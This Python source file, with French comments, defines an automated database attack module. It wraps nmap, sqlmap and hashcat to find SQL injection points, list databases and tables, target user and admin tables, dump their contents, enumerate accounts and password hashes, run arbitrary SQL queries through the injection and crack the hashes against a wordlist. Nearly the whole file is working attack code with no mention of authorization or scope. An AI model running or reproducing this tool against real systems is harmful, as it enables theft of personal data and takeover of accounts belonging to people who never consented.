#!/usr/bin/env python3
"""
Database Expert - Implémentation RÉELLE
Extraction, cracking, manipulation de bases de données
"""

import asyncio
import os
import re
import hashlib
import tempfile
from typing import Dict, Any, List, Optional
from pathlib import Path


class DatabaseExpert:
    """Expert en manipulation de bases de données avec commandes RÉELLES"""
    
    def __init__(self):
        from ..core.async_executor import AsyncExecutor
        self.executor = AsyncExecutor()
        self.temp_dir = Path(tempfile.gettempdir()) / "db_operations"
        self.temp_dir.mkdir(exist_ok=True)
    
    async def detect_database(
        self,
        target_url: str
    ) -> Dict[str, Any]:
        """
        Détection RÉELLE du type de base de données avec nmap et sqlmap
        
        Args:
            target_url: URL cible
        
        Returns:
            Dict avec type de DB et informations
        """
        results = {
            'target': target_url,
            'db_type': 'unknown',
            'ports_open': [],
            'injection_points': []
        }
        
        # Étape 1: Scanner les ports DB courants avec nmap
        target_host = target_url.split('/')[2].split(':')[0]
        db_ports = "3306,5432,1433,27017,6379,5984"
        
        cmd = f"nmap -p {db_ports} -sV --open {target_host} -oG -"
        stdout, _ = await self.executor.run_command(cmd, timeout=60)
        
        # Parser résultats nmap
        for line in stdout.split('\n'):
            if 'open' in line.lower():
                if '3306' in line:
                    results['db_type'] = 'MySQL/MariaDB'
                    results['ports_open'].append(3306)
                elif '5432' in line:
                    results['db_type'] = 'PostgreSQL'
                    results['ports_open'].append(5432)
                elif '1433' in line:
                    results['db_type'] = 'MSSQL'
                    results['ports_open'].append(1433)
                elif '27017' in line:
                    results['db_type'] = 'MongoDB'
                    results['ports_open'].append(27017)
        
        # Étape 2: Test d'injection SQL avec sqlmap
        if target_url.startswith('http'):
            sqlmap_cmd = f"sqlmap -u '{target_url}' --batch --level=1 --risk=1 --dbms={results['db_type']} --banner"
            sqlmap_out, _ = await self.executor.run_command(sqlmap_cmd, timeout=120)
            
            if 'injectable' in sqlmap_out.lower():
                results['injection_points'].append(target_url)
                results['injectable'] = True
                
                # Extraire le banner/version
                banner_match = re.search(r'banner:\s*["'']([^"'']+)["'']', sqlmap_out, re.IGNORECASE)
                if banner_match:
                    results['version'] = banner_match.group(1)
        
        return results
    
    async def extract_database_schema(
        self,
        target_url: str,
        database_name: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Extraction RÉELLE du schéma de base de données via SQLMap
        
        Args:
            target_url: URL vulnérable
            database_name: Nom de la DB (None = auto-detect)
        
        Returns:
            Dict avec schéma (tables, colonnes)
        """
        results = {'tables': [], 'columns': {}}
        
        # Phase 1: Lister les databases
        if not database_name:
            cmd = f"sqlmap -u '{target_url}' --batch --dbs"
            stdout, _ = await self.executor.run_command(cmd, timeout=180)
            
            # Parser les noms de DB
            dbs = re.findall(r'\[\*\]\s+(\w+)', stdout)
            if dbs:
                database_name = dbs[0]  # Prendre la première
                results['databases'] = dbs
        
        if database_name:
            # Phase 2: Lister les tables
            cmd = f"sqlmap -u '{target_url}' --batch -D {database_name} --tables"
            stdout, _ = await self.executor.run_command(cmd, timeout=180)
            
            tables = re.findall(r'\|\s+(\w+)\s+\|', stdout)
            results['tables'] = list(set(tables))
            
            # Phase 3: Extraire colonnes des tables sensibles
            sensitive_tables = [t for t in tables if any(
                keyword in t.lower() for keyword in ['user', 'admin', 'account', 'member', 'customer']
            )]
            
            for table in sensitive_tables[:3]:  # Limiter à 3 tables
                cmd = f"sqlmap -u '{target_url}' --batch -D {database_name} -T {table} --columns"
                stdout, _ = await self.executor.run_command(cmd, timeout=120)
                
                columns = re.findall(r'\|\s+(\w+)\s+\|', stdout)
                results['columns'][table] = columns
        
        return results
    
    async def dump_table_data(
        self,
        target_url: str,
        database: str,
        table: str,
        columns: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Dump RÉEL des données d'une table via SQLMap
        
        Args:
            target_url: URL vulnérable
            database: Nom de la base
            table: Nom de la table
            columns: Colonnes spécifiques (None = toutes)
        
        Returns:
            Dict avec données dumpées
        """
        output_file = str(self.temp_dir / f"dump_{table}.csv")
        
        cmd = f"sqlmap -u '{target_url}' --batch -D {database} -T {table}"
        
        if columns:
            cols_str = ','.join(columns)
            cmd += f" -C {cols_str}"
        
        cmd += f" --dump --dump-format=CSV --csv-del='|'"
        
        stdout, stderr = await self.executor.run_command(cmd, timeout=300)
        
        # SQLMap sauvegarde dans ~/.local/share/sqlmap/output/
        # Trouver le fichier de dump
        dump_pattern = re.search(r'Table.*dumped to.*:\s*(.+\.csv)', stdout)
        
        if dump_pattern:
            dump_file = dump_pattern.group(1).strip()
            
            if os.path.exists(dump_file):
                with open(dump_file, 'r') as f:
                    data = f.read()
                
                return {
                    'success': True,
                    'table': table,
                    'file': dump_file,
                    'preview': data[:1000],  # Preview
                    'rows': len(data.split('\n'))
                }
        
        return {
            'success': False,
            'message': 'Dump échoué ou fichier introuvable',
            'stdout': stdout[:500]
        }
    
    async def crack_hashes(
        self,
        hashes: List[str],
        hash_type: Optional[str] = None,
        wordlist: str = "/usr/share/wordlists/rockyou.txt"
    ) -> Dict[str, Any]:
        """
        Cracking RÉEL de hashes avec hashcat
        
        Args:
            hashes: Liste de hashes à cracker
            hash_type: Type de hash (None = auto-detect)
            wordlist: Wordlist à utiliser
        
        Returns:
            Dict avec hashes crackés
        """
        if not hashes:
            return {'error': 'Aucun hash fourni'}
        
        if not os.path.exists(wordlist):
            return {
                'error': 'Wordlist introuvable',
                'suggestion': 'Installez rockyou: sudo apt install seclists'
            }
        
        # Créer fichier temporaire avec les hashes
        hash_file = str(self.temp_dir / f"hashes_{os.getpid()}.txt")
        with open(hash_file, 'w') as f:
            f.write('\n'.join(hashes))
        
        # Auto-détection du type de hash si non spécifié
        if not hash_type:
            hash_type = self._detect_hash_type(hashes[0])
        
        # Mapping hashcat
        hashcat_modes = {
            'md5': '0',
            'sha1': '100',
            'sha256': '1400',
            'sha512': '1700',
            'bcrypt': '3200',
            'ntlm': '1000'
        }
        
        mode = hashcat_modes.get(hash_type.lower(), '0')
        
        # Commande hashcat
        potfile = str(self.temp_dir / "hashcat.pot")
        cmd = (
            f"hashcat -m {mode} {hash_file} {wordlist} "
            f"--potfile-path {potfile} --quiet --force"
        )
        
        stdout, stderr = await self.executor.run_command(cmd, timeout=600)
        
        # Lire le potfile pour résultats
        cracked = {}
        if os.path.exists(potfile):
            with open(potfile, 'r') as f:
                for line in f:
                    if ':' in line:
                        hash_val, password = line.strip().split(':', 1)
                        cracked[hash_val] = password
        
        # Nettoyer
        if os.path.exists(hash_file):
            os.remove(hash_file)
        
        return {
            'total_hashes': len(hashes),
            'cracked_count': len(cracked),
            'success_rate': f"{(len(cracked)/len(hashes)*100):.1f}%",
            'cracked': cracked,
            'hash_type': hash_type
        }
    
    def _detect_hash_type(self, hash_string: str) -> str:
        """Détection du type de hash par la longueur"""
        hash_len = len(hash_string)
        
        if hash_len == 32:
            return 'md5'
        elif hash_len == 40:
            return 'sha1'
        elif hash_len == 64:
            return 'sha256'
        elif hash_len == 128:
            return 'sha512'
        elif hash_string.startswith('$2'):
            return 'bcrypt'
        else:
            return 'unknown'
    
    async def enumerate_users(
        self,
        target_url: str,
        database: str
    ) -> Dict[str, Any]:
        """
        Énumération RÉELLE des utilisateurs via SQLMap
        
        Args:
            target_url: URL vulnérable
            database: Nom de la base
        
        Returns:
            Dict avec liste d'utilisateurs
        """
        users_data = {
            'users': [],
            'admins': [],
            'with_hashes': []
        }
        
        # Trouver la table users/accounts
        schema = await self.extract_database_schema(target_url, database)
        
        user_tables = [t for t in schema.get('tables', [])
                      if any(kw in t.lower() for kw in ['user', 'member', 'account', 'admin'])]
        
        if not user_tables:
            return {'error': 'Aucune table utilisateur trouvée'}
        
        # Dumper la première table utilisateur
        table = user_tables[0]
        dump = await self.dump_table_data(target_url, database, table)
        
        if dump.get('success'):
            # Parser CSV basique
            lines = dump['preview'].split('\n')[1:]  # Skip header
            
            for line in lines[:50]:  # Limiter à 50 users
                parts = line.split('|')
                if len(parts) >= 2:
                    username = parts[0].strip()
                    users_data['users'].append(username)
                    
                    # Détecter admins
                    if 'admin' in username.lower() or (len(parts) > 3 and 'admin' in parts[3].lower()):
                        users_data['admins'].append(username)
                    
                    # Détecter colonnes password/hash
                    if len(parts) > 1 and len(parts[1]) > 20:
                        users_data['with_hashes'].append({
                            'username': username,
                            'hash': parts[1][:50]  # Truncate
                        })
        
        return users_data
    
    async def execute_sql_query(
        self,
        target_url: str,
        query: str
    ) -> Dict[str, Any]:
        """
        Exécution RÉELLE d'une requête SQL via SQLMap
        
        Args:
            target_url: URL vulnérable
            query: Requête SQL à exécuter
        
        Returns:
            Dict avec résultat de la requête
        """
        cmd = f"sqlmap -u '{target_url}' --batch --sql-query=\"{query}\""
        stdout, stderr = await self.executor.run_command(cmd, timeout=180)
        
        # Extraire le résultat
        result_match = re.search(r'sql-query.*?:\s*(.*?)(?:\s\[|$)', stdout, re.DOTALL)
        
        return {
            'query': query,
            'result': result_match.group(1).strip() if result_match else 'Aucun résultat',
            'raw_output': stdout[:1000]
        }


if __name__ == "__main__":
    # Test the module
    async def test():
        db_expert = DatabaseExpert()
        
        print("🗄️ Test DatabaseExpert")
        print("=" * 60)
        
        # Test 1: Crack hashes
        print("\n1. Test crack MD5:")
        test_hashes = [
            '5f4dcc3b5aa765d61d8327deb882cf99',  # password
            '098f6bcd4621d373cade4e832627b4f6'   # test
        ]
        
        # Note: This would require hashcat and wordlist
        print(f"Would crack {len(test_hashes)} hashes")
        
        print("\n✅ Tests terminés")
    
    asyncio.run(test())